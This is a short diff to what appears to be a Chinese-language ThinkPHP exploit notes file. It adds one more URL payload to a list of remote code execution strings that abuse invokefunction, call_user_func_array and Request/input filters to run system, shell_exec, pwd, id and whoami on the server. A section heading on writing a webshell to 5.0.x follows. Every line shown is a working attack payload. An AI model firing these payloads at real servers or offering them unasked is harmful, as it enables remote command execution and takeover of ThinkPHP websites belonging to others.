@@ -85,6 +85,7 @@ thinkphp默认未开启强制路由且默认开启路由兼容模式
 ?s=index/\think\Request/input&filter[]=system&data=pwd
 ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='whoami'
 
 #写入webshell
 5.0.x
